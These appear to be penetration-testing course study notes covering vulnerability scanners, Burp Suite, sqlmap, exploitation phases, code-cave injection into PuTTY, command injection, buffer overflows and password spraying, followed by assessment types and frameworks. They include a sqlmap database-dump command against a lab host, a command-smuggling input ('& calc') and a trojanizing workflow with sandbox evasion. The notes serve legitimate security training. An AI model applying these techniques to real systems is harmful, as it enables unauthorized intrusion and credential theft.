Scan Target with GVM

	• The Greenbone Vulnerability Manager (GVM) is a vulnerability scanning tool available in Kali Linux. It helps penetration testers and security professionals identify known vulnerabilities on target systems, generate detailed reports, and provide references for remediation.

	• Key Concepts

		○ Setup and Installation

			§ Install with:

				sudo apt install gvm

			§ Initialize with:

				sudo gvm-setup

				□ Prepares databases and generates an admin password for login.

			§ Requires additional system resources: at least 4 GB RAM recommended (instead of Kali’s default 2 GB).

			§ Start service:

				gvm-start

			§ Login via web interface with provided credentials.

		○ Database and Feed Updates

			§ GVM relies on vulnerability feeds (similar to signature databases).

			§ Updates can take hours to complete.

			§ Must be fully synced before running scans to ensure the latest vulnerability data is used.

		○ Running a Scan

			§ Access via the Scans tab → Wizard.

			§ Example target: Metasploitable server at 10.0.2.32.

			§ Scan workflow:

				□ Starts as Requested → Queued → Running.

				□ Produces a detailed report once complete.

		○ Scan Results and Reporting

			§ Results ranked by severity rating.

			§ Example findings:

				□ Multiple Ruby remote code execution vulnerabilities (port 8787).

				□ TWiki command execution (port 80).

				□ Ingreslock backdoor (port 1524, root shell access).

			§ Reports link directly to CVEs for reference (e.g., 35 CVEs identified).

			§ Detailed entries show:

				□ Description of issue.

				□ Evidence from detection results (e.g., UID=0 response proving root access).

				□ Recommended remediation (e.g., system clean for backdoor).

		○ Why GVM is Important

			§ Provides a broad vulnerability assessment of target systems.

			§ Produces structured reports that map issues to CVEs.

			§ Identifies critical weaknesses (like backdoors and RCEs) that may be directly exploitable.

			§ Helps pen testers prioritize follow-up exploitation testing.



#### Web Testing



Approach Web Testing

	• Web applications are now the backbone of modern services, making web application testing a critical penetration testing skill. The transcript emphasizes different approaches, attack surfaces, and areas of weakness that testers should investigate to prevent breaches.

	• Key Concepts

		○ Why Web Testing Matters

			§ Most applications are delivered as web apps or mobile apps with web backends.

			§ Real-world breaches (e.g., TalkTalk) highlight the severe consequences of insecure websites.

			§ Early testing is more effective and cheaper than reacting after a hack.

		○ Testing Approaches

			§ Crawling:

				□ Automatically enumerates all web pages.

				□ Builds a map of potential attack surfaces.

			§ Intercepting traffic with a proxy:

				□ Observes and manipulates traffic between client and server.

				□ Helps uncover hidden vulnerabilities beyond static crawling.

			§ Manual checks:

				□ Comments in code (may expose credentials or dev notes).

				□ Reviewing client-side code for weaknesses (e.g., JavaScript security gaps).

		○ Key Areas to Investigate

			§ Server \& technology stack:

				□ Identify server software, frameworks, and protocols.

				□ Check for unpatched vulnerabilities and cryptographic weaknesses.

			§ Transport security:

				□ Websites should use HTTPS, but many still rely on HTTP or weak HTTPS.

				□ WebSockets introduce new risks—must be reviewed carefully.

			§ Authentication mechanisms:

				□ Payment gateway integrations (PCI compliance).

				□ Backend authentication servers vulnerable to injection attacks.

				□ Password reset functionality often less robustly tested.

				□ Risks from default or hardcoded credentials.

			§ Session management:

				□ Session hijacking or cookie theft.

				□ Predictable session tokens that attackers can pre-compute.

		○ Common Web Vulnerabilities

			§ Injection attacks (SQL, LDAP, etc.) via poorly validated queries.

			§ Man-in-the-middle risks from insecure transport.

			§ Session hijacking through predictable or stolen cookies.

			§ Remote code execution from misconfigured servers or frameworks.

			§ Information leakage from developer comments or client-side code.



Test Websites with Burp Suite

	• Burp Suite is a widely used web application testing tool that enables penetration testers to intercept, inspect, and manipulate HTTP/S traffic between a browser and a web server. The Community Edition (included in Kali Linux) is sufficient for learning and basic testing, while the professional version is used for full-scale customer assessments.

	• Key Concepts

		○ Burp Suite Basics

			§ Found in Kali → Applications → Web Application Analysis → Burp Suite.

			§ Community Edition:

				□ Only allows temporary projects.

				□ Professional edition allows persistent storage of projects.

			§ Menu provides core functions: Burp, Project, Intruder, Repeater, Window, Help.

			§ Activity tabs include: Dashboard, Target, Proxy, Intruder, Repeater, etc.

		○ Target Tab

			§ Site Map: Displays structure of the web application (URLs, directories, pages).

			§ Scope: Defines which sites/URLs are in-scope for testing.

			§ Issue Definitions: Lists potential vulnerabilities Burp can identify, with severity ratings.

		○ Proxy Functionality

			§ Intercept mode:

				□ Captures traffic between browser and server.

				□ Allows testers to pause, inspect, and modify requests before forwarding them.

			§ By default, Burp listens on localhost:8080.

			§ Browser must be configured to route traffic through this proxy:

				□ Proxy: 127.0.0.1

				□ Port: 8080

		○ Testing Example

			§ Test site: http://zero.webappsecurity.com (a sample vulnerable banking app).

			§ Logged in with test credentials: username / password.

			§ Burp captured traffic, showing:

				□ Requests and responses (raw format or rendered view).

				□ Full site map, including directories and pages.

			§ Allows deeper inspection of session data, authentication flows, and vulnerabilities.

		○ Why Burp Suite is Important

			§ Central tool for web application penetration testing.

			§ Facilitates:

				□ Mapping web applications (structure, endpoints, parameters).

				□ Inspecting \& altering requests/responses.

				□ Identifying vulnerabilities (e.g., injection flaws, weak authentication, misconfigurations).

			§ Integrates manual and automated approaches for thorough testing.



Check Web Servers with Nikto

	• Nikto is a lightweight, command-line web server scanner used to identify vulnerabilities, misconfigurations, and outdated software. It is a common tool for quick reconnaissance of web servers in penetration testing.

	• Key Concept

		○ Purpose of Nikto

			§ Designed to check web servers for:

				□ Known vulnerabilities

				□ Configuration issues

				□ Outdated software

			§ Helps pen testers quickly determine areas needing deeper investigation.

		○ Running Nikto

			§ Found under Kali → Applications → Vulnerability Analysis.

			§ Example command:

				nikto -h 10.0.2.8

				□ -h specifies the host to scan.

		○ Output \& Findings

			§ Example target: Metasploitable host.

			§ Detected:

				□ Apache 2.2.8 on Ubuntu.

				□ Missing hardening features (security best practices not enabled).

				□ Outdated Apache version → potential vulnerabilities.

			§ Found several issues linked to the Open Source Vulnerability Database (OSVDB).

			§ Final summary: 27 items flagged for attention.

		○ Strengths of Nikto

			§ Quick, easy-to-use scanner.

			§ Provides immediate visibility into server misconfigurations and outdated software.

			§ Maps findings to known vulnerability databases for reference.

		○ Limitations

			§ Focuses on server-side vulnerabilities (not full web app testing).

			§ Results often require further manual validation.

			§ May generate many false positives.

			§ Lacks stealth → easily detectable by intrusion detection systems.



Fingerprint Web Servers

	• Fingerprinting web servers is an important early step in web application testing. It helps identify the type and version of the underlying web server even when banners are missing or altered. Different tools can be used to infer server details, but results are often approximate rather than exact.

	• Key Concepts

		○ Why Fingerprinting Matters

			§ Web application security depends not just on the app itself but also on the environment it runs in.

			§ Attackers often exploit weaknesses in outdated or misconfigured web servers.

			§ Server banners may be present, removed, or spoofed; fingerprinting provides alternate ways of deducing server type/version.

		○ Tools for Web Server Fingerprinting

			§ Httprecon

				□ Windows-based tool (downloaded from Computec).

				□ Requires OCX components registered in SysWOW64.

				□ Produces:

					® Match List → ranked server guesses with confidence levels.

					® Fingerprint Details → summary fingerprint.

					® Report Preview → detailed analysis.

				□ Example: Detected Apache 2.0.59 with 100% confidence, though the banner indicated 2.2.8.

			§ Httprint

				□ Downloadable tool from Net Square, GUI-based.

				□ Needs disabling of ICMP and SSL auto-detect for accuracy.

				□ Outputs results in HTML format.

				□ Example:

					® On zero.webappsecurity.com: Deduced Apache 1.3 with 61% confidence.

					® On Metasploitable: Banner reported Apache 2.2.8, deduced 2.0.x with 57% confidence.

			§ Uniscan

				□ Comes pre-installed in Kali Linux.

				□ Run with:

					uniscan -u <target>

				□ Example:

					® Detected WEBrick Ruby server on Hacme Casino site.

					® Detected Apache Coyote 1.1 on the Zero Bank site.

		○ Observations

			§ Fingerprinting results often vary and may conflict with banners.

			§ Provides useful hints for further testing but should not be relied on as absolute truth.

			§ Helps narrow down which vulnerabilities are most relevant to the environment.



Web Server Penetration using SQLmap

	• How to use SQLmap, an automated SQL injection tool, to identify and exploit vulnerabilities in a web server’s login form. By leveraging SQLmap, a tester can move from reconnaissance to full exploitation, including dumping databases and cracking password hashes.

	• Key Concepts

		○ Reconnaissance with Nmap

			§ Target: Europa server (10.10.10.22) in a lab environment.

			§ Scan:

				nmap -PS -F -A 10.10.10.22

			§ Findings:

				□ Open ports → 22 (SSH), 80 (HTTP), 443 (HTTPS).

				□ Web service: Apache 2.4.18.

				□ SSL certificate showed domains:

					® europacorp.htb

					® www.europacorp.htb

					® admin-portal.europacorp.htb

			§ This indicated the presence of virtual hosts / name-based virtual hosting.

		○ Discovering the Web Application

			§ Default Apache page appeared on http://10.10.10.22 and https://10.10.10.22.

			§ Added admin-portal.europacorp.htb to /etc/hosts.

			§ Result: A login page was discovered — potential injection point.

		○ SQLmap Usage

			§ SQLmap command:

				sqlmap -u https://admin-portal.europacorp.htb --forms --crawl=2 --threads=10 --dump

			§ Options explained:

				□ --forms → looks for input forms.

				□ --crawl=2 → crawls the site up to depth 2.

				□ --threads=10 → speeds up testing.

				□ --dump → extracts database contents if vulnerable.

		○ Exploitation Results

			§ SQLmap findings:

				□ Database identified: MySQL.

				□ Parameter email in login form → union-injectable.

				□ Vulnerable to both SQL injection and cross-site scripting (XSS).

				□ Detected 5 columns in the SQL query.

			§ Actions performed:

				□ Executed SQL injection.

				□ Dumped database tables.

				□ Extracted password hashes.

				□ Cracked hashes → obtained administrative credentials.

		○ Why SQLmap is Important

			§ Automates detection and exploitation of SQL injection.

			§ Can fingerprint databases, test different injection techniques, dump sensitive data, and even crack credentials.

			§ Saves time compared to manual testing, but results still require validation.

			§ Demonstrates real-world risk by proving data exfiltration and credential compromise.



#### Understand Exploit Code



Exploit a Target

	• Focuses on the delivery and exploitation phases of the cyber kill chain — where malware or attack payloads are introduced into a target system and executed. It reviews common delivery/exploitation techniques and illustrates them with high-profile case studies like WannaCry, Stuxnet, Saudi Aramco, and Sony PlayStation.

	• Key Concept

		○ Delivery Mechanisms

			§ Four common methods to deliver malicious payloads:

				• Email attachments (infected executables, Word/PDF files with malicious macros or exploits).

				• Malicious websites/hyperlinks (drive-by downloads, trojanized software, phishing).

				• Exposed services or ports (sending exploit packets or direct malware uploads).

				• Removable media (USB drives with auto-run malware, often used in isolated networks).

		○ Exploitation Techniques

			§ Human exploitation: tricking users into executing malicious attachments.

			§ Document/application exploits: Word, PDF, Flash, or spreadsheets with embedded malicious code.

			§ Browser exploitation: malicious websites exploiting browser vulnerabilities to install droppers.

			§ Credential misuse: stolen/cracked credentials from password dumps or clear-text traffic.

			§ Service exploitation: using vulnerabilities in exposed services (SMB, print spooler, etc.) to gain access silently.

		○ WannaCry (2017)

			§ Delivery: Email with infected ZIP file.

			§ Exploitation: Zero-day SMB vulnerability EternalBlue (NSA-developed).

			§ Effect: Massive ransomware propagation across networks, leveraging infected machines as launchpads.

		○ Stuxnet (2010)

			§ Delivery: Initially suspected USB drives; later traced to supplier compromise and USB spread.

			§ Exploitation: Zero-day vulnerabilities (e.g., Microsoft Print Spooler) + Siemens PLC injection.

			§ Effect: Targeted Iranian uranium centrifuges, showcasing state-sponsored cyber warfare.

		○ Saudi Aramco (2012)

			§ Delivery: Malicious website clicked by an employee.

			§ Exploitation: Browser vulnerability dropped Shamoon malware.

			§ Effect: 30,000 workstations wiped, severe business disruption.

		○ Sony PlayStation Hack (2011)

			§ Delivery: External penetration via vulnerable service.

			§ Exploitation: SMB flaw in Red Hat Linux Apache servers.

			§ Effect: Breach exposed 77 million credit cards, one of the largest data breaches.

		○ Lessons Learned

			§ Delivery often relies on social engineering (phishing, malicious attachments, USBs).

			§ Exploitation leverages software vulnerabilities (zero-days, unpatched systems, weak credentials).

			§ High-profile incidents demonstrate:

				• Nation-state cyber warfare (Stuxnet).

				• Ransomware at global scale (WannaCry).

				• Mass disruption of industry (Saudi Aramco).



Finding Caves for Code Injection

	• explains how attackers can modify legitimate executables by injecting malicious code. It introduces the Portable Executable (PE) format, explores how to analyze executables, and discusses two main injection methods: adding a new section or using code caves. Tools like PE Studio and Cminer are demonstrated.

	• Key Concepts

		○ Trojan Programs

			§ Malware disguised as legitimate software.

			§ Two approaches:

				□ Entirely malicious software disguised as useful.

				□ Legitimate software altered to include malicious code.

		○ Portable Executable (PE) Format

			§ Windows executables (EXE) have a structured format called PE.

			§ Components:

				□ MS-DOS stub (first few hundred bytes, with an error message if run incorrectly).

				□ PE Header (locations and sizes of code/data, OS target, stack size).

				□ Sections (code or data segments).

			§ Important fields:

				□ Section alignment (e.g., 0x1000).

				□ Image base (e.g., 0x400000).

				□ Directories \& sections (define runtime functions, imports, exports, etc.).

			§ Manifest: often contains XML configuration.

		○ Tools for analysis:

			§ Hex editors (to view raw PE file structure).

			§ PE Studio (GUI tool to automatically parse and analyze executables).

		○ Code Injection Techniques

			§ Adding a new section: Create an entirely new area in the PE file for malicious code.

			§ Using code caves: Insert malicious code into unused areas (“caves”) within existing sections of the executable.

			§ Cminer tool:

				□ Scans executables to find available code caves.

				□ Example findings:

					® Notepad.exe → 6 caves, 3–511 bytes, in data sections.

					® Putty.exe → 6 caves, larger caves, also in data sections.

		○ Anti-Detection Consideration

			§ If malware executes immediately at startup, it risks detection by sandboxing or anti-malware tools.

			§ Attackers often design Trojans to trigger code execution at a later user interaction (e.g., when clicking a menu item), making detection harder.



Understand Code Injection

	• demonstrates how attackers (and penetration testers) can perform code injection into executables. Using PuTTY as the target, the process shows how to identify injection points, insert malicious code into unused space (code caves), and modify the program flow to execute that code stealthily. It also explains how to finalize and legitimize the modified binary so it runs without warnings.

	• Key Concepts

		○ Injection Point Identification

			§ The target application (PuTTY) is analyzed using the x32dbg debugger.

			§ The login prompt (“Login as:”) is identified as a logical point for code injection.

			§ The instruction at that point is replaced with a jump instruction redirecting execution to a code cave.

		○ Code Caves and Injection

			§ A code cave (section of unused null bytes) in the rdata section is chosen as the injection space.

			§ Example injected code: simple no-op instructions (0x90) for demonstration.

			§ The injection must include a return jump back to the original code location to preserve program flow.

		○ Debugger Workflow

			§ x32dbg is used to:

				• Search for string references (login as).

				• Insert a jump into the cave.

				• Write injected instructions.

				• Set breakpoints and verify execution flow.

			§ The program is run to confirm that execution passes into the injected code before returning to normal behavior.

		○ Manual Patching

			§ If saving changes through x32dbg fails, modifications can be applied with a hex editor.

			§ The binary changes are recorded (e.g., replaced hex instructions).

			§ A new executable is saved (in the example, renamed to mutty.exe).

		○ Ensuring Executable Runs

			§ After injection, the modified section must be marked executable.

			§ The PE editor in LordPE is used to:

				• Edit the section header (rdata) → mark as executable.

				• Recalculate the checksum so Windows accepts the modified binary.

			§ The patched file can now execute normally without triggering system errors.

		○ Security \& Attacker Perspective

			§ This technique mirrors real-world attacker methods:

				• Modify legitimate software to run hidden malicious payloads.

				• Delay execution until a trigger event (e.g., login prompt) to avoid sandbox detection.

			§ In penetration testing, such methods are used to demonstrate vulnerabilities and credential harvesting risks.



Understand Command Injection

	• The transcript explains command injection vulnerabilities, focusing on a real-world case (Rust Standard Library vulnerability CVE-2024-24576) and demonstrates how attackers can exploit improperly sanitized input to execute arbitrary system commands.

	• Key Concepts

		○ The Vulnerability

			§ CVE-2024-24576 (published April 2024).

			§ Affected the Rust Standard Library (before version 1.77.2).

			§ Root cause: failure to properly escape arguments when invoking batch files on Windows.

			§ Impact: Attackers controlling input arguments could inject and execute arbitrary shell commands.

			§ Other languages (like Python) using similar system calls were also affected.

		○ Injection Basics

			§ Command injection is a form of injection attack.

			§ Works by appending crafted extra data to normal input.

			§ The payload causes the target system to escape legitimate processing and execute unintended commands.

			§ Goal: Run additional malicious commands alongside the expected one.

		○ Python Demonstration

			§ A simple Python program:

				□ Reads user input.

				□ Passes it to a batch file (bad.bat) as an argument.

				□ Batch file simply echoes back the input.

			§ Exploit:

				□ Input "Hello World" → prints back correctly.

				□ Input "Hello World \& calc" → prints back message and launches Windows Calculator.

			§ This shows how unescaped input can trigger unexpected system commands.

		○ Lessons Learned

			§ Validation and sanitization of input are critical.

			§ Never pass raw user input directly to system-level commands or scripts.

			§ Use safe APIs and parameterized calls instead of concatenating command strings.

			§ Security patches (like Rust’s fix) reinforce the need to update environments promptly.



Understand Buffer Overflows

	• explains how buffer overflow vulnerabilities work by walking through a simulated program. It shows how writing more data than the allocated buffer space allows can overwrite critical values on the stack (like the return address), enabling attackers to redirect execution flow to malicious payloads.

	• Key Concepts

		○ Buffer Overflow Basics

			§ A buffer overflow occurs when input data exceeds the allocated buffer size.

			§ Extra data overwrites adjacent memory, including the return address on the stack.

			§ This allows attackers to redirect execution to injected payload code.

		○ Simulated Example (MASM Program)

			§ Program simulates receiving a packet with a user name.

			§ Uses a routine (sco) to copy this input into a fixed 32-byte buffer.

			§ If the input is too long, data spills over, overwriting stack memory.

			§ Includes three parts in the malicious packet:

				□ Padding (filler bytes, e.g., “A”s).

				□ Exploit (new return address pointing to payload).

				□ Payload (malicious code to run).

			§ Debugger Walkthrough

				□ Debugger (MASM/x32dbg) shows how the stack evolves step-by-step:

					® Normal behavior: “Hello, <name>” message.

					® Malicious input: overflows the 32-byte buffer, overwrites return address.

				□ When the subroutine ends (RET instruction), instead of returning to the normal code, execution jumps to the attacker’s payload injected in the buffer.

				□ Payload in the example executes a malicious message box.

		○ Technical Details

			§ Registers in use:

				□ EBP saves stack pointer.

				□ EBX points to input packet.

				□ EDX/ECX manage local buffer copies.

				□ EDI inserts the copied string into the final message.

			§ Stack pointer (ESP) and return address are critical points of attack.

			§ Overwritten return address now points to 403024 (payload start).

		○ Security Implications

			§ Many real-world services are vulnerable if they fail to validate input length.

			§ Classic attack structure: Padding → New Return Address → Payload.

			§ Buffer overflows are a major vector for remote code execution (RCE).

			§ Exploits often leverage known memory addresses or gadgets to reliably execute attacker code.



Password Spraying Active Directory

	• The transcript explains how password spraying works as an attack technique against Active Directory (AD), using tools like the PowerShell script DomainPasswordSpray. It shows how attackers attempt a small set of commonly used or guessed passwords across many accounts to find weak credentials.

	• Key Concepts

		○ Password Spraying Defined

			§ Unlike brute force (which targets one account with many passwords), password spraying targets many accounts with one (or a few) common passwords.

			§ Reduces the risk of account lockouts and is more effective in enterprise environments where users often choose weak or reused passwords.

		○ Tools and Execution

			§ Example tool: DomainPasswordSpray.ps1 (PowerShell script by dafthack).

			§ Can be run with:

				□ A single guessed password (e.g., kittykat).

				□ A password list (dictionary).

			§ Demonstrated on a domain workstation while logged in as a domain user.

		○ Detection of Weak Passwords

			§ In the example, running the script with password kittykat revealed that user achtar was using that password.

			§ Such results highlight weak password hygiene across enterprises.

		○ Enterprise Password Weakness

			§ Around 30% of enterprise passwords are weak.

			§ With the right password list, password spraying can reliably uncover vulnerable accounts.

			§ This makes it a high-value attack technique for penetration testers and adversaries alike.



Find Exploit Code

	• explains how the process of finding and using exploit code has evolved. Originally, testers had to research and write their own exploits, but today they can leverage public exploit databases, research reports, and GitHub repositories. It highlights resources, risks, and cautions when sourcing exploit code.

	• Key Concepts

		○ Historical vs. Modern Approach

			§ Earlier: Pen testers had to discover vulnerabilities themselves and write exploits from scratch, requiring debugging and MASM programming expertise—a process that could take weeks.

			§ Now: Exploits and analyses are widely available from researchers, advisory sites, and exploit databases, making it faster to find and use working exploits.

		○ Sources of Exploit Information

			§ Research sites \& advisories:

				□ Malware Archeology (aggregates reports).

				□ Malwarebytes Labs (offers free technical writeups).

				□ Cyber research firms (some open, some paid threat intelligence).

			§ Exploit databases:

				□ Exploit-DB (exploit-db.com) – A key source of ready-made exploit code.

					® Provides filters (e.g., remote exploits).

					® Metadata includes date, title, platform, author, and flags:

						◊ D: Download exploit code.

						◊ A: Download vulnerable application.

						◊ V: Code verified.

				□ Other sources:

					® Legal Hackers (includes proof-of-concept code but fewer recent updates).

					® GitHub repos of independent researchers.

		○ Example

			§ A remote exploit listed in Exploit-DB: Remote Desktop Web Access attack.

			§ Demonstrated as a Python exploit usable in Metasploit.

		○ Cautions

			§ Legitimacy concerns: Exploit code from individuals may contain malware or backdoors.

			§ Quality issues: Some exploits may have intentional mistakes (forcing the user to fix before use), while others contain unintentional errors.

			§ Always verify the source and inspect code before execution.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Security Testing Essential

#### Understanding Security Assessments



Language is Important

	• Language and terminology in cybersecurity assessments matter a great deal. Misusing terms (e.g., calling a vulnerability scan a penetration test) can cause serious misunderstandings, leading to false confidence, poor decisions, and potentially severe security consequences.

	• Key Concepts

		○ Importance of Clear Language

			§ Different security assessments (vulnerability scan vs. penetration test) are not interchangeable.

			§ Mislabeling creates confusion for leadership and can lead to a dangerous false sense of security.

		○ Consequences of Misinterpretation

			§ If management cannot distinguish between assessment types, they may think their systems are safer than they really are.

			§ This can result in:

				□ Production outages from issues that were overlooked.

				□ Data breaches requiring public disclosure, harming customers and reputation.

			§ Root cause often traces back to misunderstanding security terminology.

		○ Five Distinct Types of Security Assessments

			§ Risk Assessment – Identifies risks and their impact.

			§ Security Controls Assessment – Evaluates whether controls are in place and working.

			§ Compliance Assessment – Checks alignment with regulatory or industry requirements.

			§ Vulnerability Assessment – Identifies weaknesses in systems.

			§ Penetration Test – Simulates real-world attacks to exploit weaknesses.

		○ Choosing the Right Assessment

			§ Each assessment has different goals, techniques, and outcomes.

			§ The effectiveness of security efforts depends on matching the right type of assessment to the organization’s needs.



Risk Assessments

	• The purpose of a risk assessment is to identify and evaluate where an organization is most vulnerable to threats, so it can prioritize protections and strengthen its ability to achieve its mission. Understanding the distinction between threats and vulnerabilities is essential to this process.

	• Key Concepts

		○ Goal of a Risk Assessment

			§ Determine areas where an organization is most exposed to attack or disruption.

			§ Strengthen the quality of other security assessments by using risk assessment results as an input.

		○ Threats vs. Vulnerabilities (NIST definitions)

			§ Threat: A circumstance or event that can compromise the confidentiality, integrity, or availability (CIA) of information or systems.

				□ Examples: data breaches exposing secrets, unauthorized changes, or denial-of-service attacks.

			§ Vulnerability: A weakness that allows a threat to succeed.

				□ Examples: missing patches, default admin passwords, or physical weaknesses like a data center in a flood-prone area.

			§ Risk Assessment Process

				□ Identify relevant threats and vulnerabilities.

				□ Score risks based on two factors:

					® Likelihood: How probable is the threat exploiting the vulnerability?

					® Impact: How severe would the consequences be if it happened?

			§ Contextual Importance

				□ A recent, thorough risk assessment improves all other security activities (penetration tests, compliance checks, etc.).

				□ It guides resource prioritization so organizations focus on the most significant risks.



Calculating Risk Score

	• Risk scoring helps organizations prioritize cybersecurity risks by evaluating both the likelihood of a threat exploiting a vulnerability and the impact if it succeeds. The result guides leadership on where to focus mitigation efforts.

	• Key Concepts

		○ Likelihood (Probability of Exploitation)

			§ Defined as the probability that a threat will exploit a vulnerability.

			§ Example factors for malware on a laptop:

				□ Presence of endpoint protection.

				□ Internet usage habits.

				□ Tendency to open email attachments from unknown senders.

			§ NIST uses a low, medium, high scale for likelihood.

		○ Impact (Consequence of Exploitation)

			§ Measures the severity of harm if the threat succeeds.

			§ Example:

				□ Laptop malware infection → bad day for one user.

				□ Server network malware outbreak → costly, widespread organizational disruption.

			§ NIST also uses a low, medium, high scale for impact.

		○ Risk Score Formula

			§ Risk = Likelihood × Impact

			§ Produces a quantifiable score to compare risks and prioritize them.

		○ Goal of Risk Assessment

			§ Not to achieve perfection, but to prioritize risks so they can be reduced to an acceptable level.

			§ Aligns with leadership’s risk appetite.

		○ Data Sources for Risk Assessment

			§ External Reports:

				□ Verizon Data Breach Investigations Report.

				□ Privacy Rights Clearinghouse database of breaches.

				□ Industry-specific ISACs (Information Sharing and Analysis Centers).

			§ Internal Data:

				□ IT Service Management (ITSM) system.

				□ Help desk ticket history for past incidents.

		○ Outcome

			§ A report containing a prioritized list of cybersecurity risks that leadership should monitor and address.



Security Control Assessments

	• A security controls assessment evaluates which security controls are currently in place within an organization, using recognized security control frameworks as a baseline. The assessment highlights gaps and provides a prioritized view of where security improvements are needed.

	• Key Concepts

		○ Goal of a Security Controls Assessment

			§ Identify and document the security controls already implemented.

			§ Compare against a chosen framework to ensure coverage.

		○ Role of Frameworks

			§ Frameworks provide structured categories and sets of recommended controls (designed by governing bodies or standards organizations).

			§ Using a framework ensures consistency and alignment with best practices.

		○ Assessment Methodology

			§ Select a security control framework (e.g., NIST, ISO, CIS).

			§ Document whether each control exists in the organization.

			§ Optionally assign a quantitative score to reflect the perceived effectiveness of each control.

		○ How Assessments Are Conducted

			§ Typically based on:

				□ Interviews with technical staff.

				□ Analysis of reports, system configurations, and application settings.

			§ Results are not always exact measurements, but a mix of documented evidence and expert judgment.

		○ Outcome

			§ A prioritized list of security control gaps.

			§ Provides clarity on where the organization meets or falls short of framework expectations.

		○ Framework Overlap

			§ There are many frameworks, but most cover similar fundamental controls.

			§ Experienced practitioners recognize that frameworks are often just different ways of saying the same thing.

			§ The instructor highlights two major frameworks as most useful and practical (to be discussed next).



NIST and ISO

	• Both ISO (International Organization for Standardization) and NIST (National Institute of Standards and Technology) provide widely used security frameworks. ISO offers structured, organizational guidance for building an information security program, while NIST provides deep technical detail on security controls. Together, they complement each other for a robust security program.

	• Key Concepts

		○ ISO and IEC Collaboration

			§ ISO partnered with IEC to create international standards across industries.

			§ The ISO 27000 family (63+ standards) focuses on information security management.

		○ ISO Standards for Security

			§ ISO 27001 – the most recognized, provides the overall framework for Information Security Management Systems (ISMS).

			§ ISO 27002 – practical guidance, containing 114 specific controls across 14 domains, grouped into four themes:

				□ Organizational

				□ Physical

				□ People

				□ Technological

			§ Example: Information Security Policies is a domain with clear requirements for policy documentation.

		○ NIST Publications

			§ NIST publishes hundreds of guides on cybersecurity and IT.

			§ NIST Cybersecurity Framework (CSF):

				□ Five core categories: Identify, Protect, Detect, Respond, Recover.

				□ Helps organizations assess and manage risk within a governance context.

			§ NIST SP 800-53:

				□ Contains 1,000+ detailed controls in 18 control families (includes privacy).

				□ Categorizes controls by impact level: low, moderate, high.

				□ Originally written to support FISMA (Federal Information Security Management Act).

			§ Complementary Use

				□ ISO 27002 → guides how to organize a security program (strategic, governance-focused).

				□ NIST SP 800-53 → provides technical depth on implementing and managing security controls.

				□ Combining both gives organizations a comprehensive security posture.



Compliance Assessments

	• A compliance assessment evaluates whether an organization’s security program meets the requirements of an external authority (such as PCI DSS, HIPAA, or GLBA). Unlike other assessments that are voluntary and proactive, compliance assessments are mandatory, and failure to comply can have serious financial and operational consequences.

	• Key Concepts

		○ Purpose of a Compliance Assessment

			§ To ensure that an organization is meeting specific external requirements (legal, regulatory, or industry standards).

			§ Example: PCI DSS (Payment Card Industry Data Security Standard) applies to any organization that stores, processes, or transmits credit card data.

		○ Comparison to Security Controls Assessment

			§ Content looks very similar (controls, evidence, interviews, technology checks).

			§ Two key differences:

				□ Scope: Compliance frameworks are narrow and focused on specific types of data or risks (e.g., credit card data in PCI).

				□ Motivation: Other assessments are done voluntarily to improve security; compliance assessments are done because organizations are required to.

		○ Limitations of Compliance Standards

			§ Example: Building a security program only on PCI DSS would leave major gaps.

			§ Compliance does not equal full security; it only ensures minimum required protections.

		○ Methods of Evidence Collection

			§ Staff interviews.

			§ Reports and outputs from control technologies.

		○ Consequences of Non-Compliance

			§ Higher per-transaction fees charged by banks.

			§ In cases of willful negligence, banks may revoke the right to process credit card payments entirely.

			§ Strong financial and operational incentives drive compliance.

		○ Other Industries with Compliance Requirements

			§ Healthcare → HIPAA.

			§ Energy → NERC.

			§ Financial services → GLBA.

		○ Outcome of a Compliance Assessment

			§ Proof of compliance (attestation).

			§ Provides temporary assurance to auditors and regulators until the next review cycle.



Vulnerability Assessments

	• A vulnerability assessment is designed to ensure that technical weaknesses in systems, applications, and devices are regularly identified, evaluated, and remediated. It focuses on finding exploitable vulnerabilities that attackers could use and prioritizing them based on severity.

	• Key Concepts

		○ Goal of a Vulnerability Assessment

			§ Validate that vulnerabilities are identified and remediated on a recurring basis.

			§ Ensure organizations stay ahead of attackers by addressing weaknesses proactively.

		○ Exploitable Vulnerabilities

			§ Key focus is on vulnerabilities that an attacker could realistically exploit.

			§ Examples:

				□ Low risk: Missing patch that only allows directory listing.

				□ High/critical risk: SQL injection that exposes usernames and passwords.

		○ Scope of Assessment

			§ Should be broad and inclusive:

				□ Servers.

				□ Workstations.

				□ Mobile devices.

				□ Applications and databases.

			§ If it has an IP address, it should be scanned.

		○ Tools and Methods

			§ Typically conducted with automated scanning tools on a regular schedule.

			§ Best practices for scans:

				□ Authenticated scans of host systems.

				□ Unauthenticated scans of internet-facing applications.

				□ Authenticated scans of non-production app instances.

				□ Configuration scans of systems and applications.

			§ NIST provides additional manual assessment techniques to complement automation.

		○ Outcome

			§ A prioritized list of vulnerabilities based on severity and exploitability.

			§ Includes recommendations for remediation.



Penetration Tests

	• A penetration test is the most advanced form of security assessment, where testers go beyond identifying weaknesses and attempt to actively exploit them. It validates how vulnerabilities could be leveraged by attackers and provides realistic insight into an organization’s true security posture.

	• Key Concepts

		○ Penetration Test as the Pinnacle

			§ Unlike other assessments that stop at identifying weaknesses, a penetration test attempts to exploit them.

			§ Builds on the results of risk, vulnerability, compliance, and controls assessments.

		○ Scoping a Pentest

			§ Insights from prior assessments (e.g., vulnerability scans, network diagrams, firewall rules) help determine:

				□ Which systems and processes to test.

				□ Which attack methods to attempt.

			§ Scope and depth often depend on client preferences.

		○ Types of Penetration Tests

			§ White Box Testing

				□ Pentester receives extensive internal information (reports, configs, even source code).

				□ Focuses effort on testing the most relevant and high-risk areas.

			§ Black Box Testing

				□ Pentester starts with no internal knowledge, simulating an outside attacker.

				□ Most realistic but risks missing weaknesses due to limited visibility.

			§ Gray Box Testing

				□ Middle ground—tester gets partial internal knowledge.

				□ Balances realism with efficiency by narrowing focus while still simulating an outsider’s perspective.

				□ Most commonly used in practice.

		○ Pre-Engagement Phase

			§ The amount of knowledge shared with testers is negotiated before the assessment.

			§ Determines whether the test leans more toward white box, black box, or gray box.



Goals of a Pen Test

	• The goals of a penetration test should be clearly defined and tailored to the organization’s priorities within the CIA triad (Confidentiality, Integrity, Availability). The chosen objectives guide the scope of testing and ensure meaningful, ethical outcomes.

	• Key Concepts

		○ Common Pen Test Goals

			§ Many penetration tests aim to steal privileged credentials.

			§ Other possible goals include:

				□ Gaining access to the CFO’s inbox.

				□ Exfiltrating intellectual property.

				□ Extracting customer data.

